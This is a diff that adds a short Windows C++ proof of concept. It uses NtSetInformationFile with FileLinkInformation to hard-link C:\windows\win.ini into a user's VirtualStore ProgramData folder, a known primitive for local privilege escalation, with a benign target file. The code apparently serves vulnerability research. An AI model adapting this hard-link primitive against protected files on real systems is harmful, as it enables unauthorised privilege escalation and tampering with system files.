@@ -1,0 +1,54 @@
+#include <windows.h>
+#include <sddl.h>
+#include <stdio.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
+
+
+
+extern "C" int NTAPI  NtSetInformationFile(
+     HANDLE                 FileHandle,
+     PIO_STATUS_BLOCK       IoStatusBlock,
+     PVOID                  FileInformation,
+     ULONG                  Length,
+     FILE_INFORMATION_CLASS FileInformationClass
+);
+
+
+typedef struct _FILE_LINK_INFORMATION {
+#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS5)
+    union {
+        BOOLEAN ReplaceIfExists;  // FileLinkInformation
+        ULONG Flags;              // FileLinkInformationEx
+    } DUMMYUNIONNAME;
+#else
+    BOOLEAN ReplaceIfExists;
+#endif
+    HANDLE RootDirectory;
+    ULONG FileNameLength;
+    WCHAR FileName[0x1000];
+} FILE_LINK_INFORMATION, * PFILE_LINK_INFORMATION;
+
+void main()
+{
+    
+
+   // 创建硬链接 到C:\\windows\\win.ini
+    HANDLE hFILE=CreateFileA("C:\\windows\\win.ini", MAXIMUM_ALLOWED, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    IO_STATUS_BLOCK io;
+    _FILE_LINK_INFORMATION buf = {0};
+    
+    buf.ReplaceIfExists = TRUE;
+
+    buf.FileNameLength = wcslen(L"\\??\\C:\\Users\\ZTL.WIN-SQOTM00FP8U\\AppData\\Local\\VirtualStore\\ProgramData\\test0\\666.txt") * sizeof(WCHAR);
+
+    memcpy(buf.FileName, L"\\??\\C:\\Users\\ZTL.WIN-SQOTM00FP8U\\AppData\\Local\\VirtualStore\\ProgramData\\test0\\666.txt", buf.FileNameLength);
+
+    printf("NtSetInformationFile %x\n",NtSetInformationFile(hFILE, &io, &buf, buf.FileNameLength+0xc, (FILE_INFORMATION_CLASS)11));//FileLinkInformation
+
+   
+    getchar();
+} 
+
+
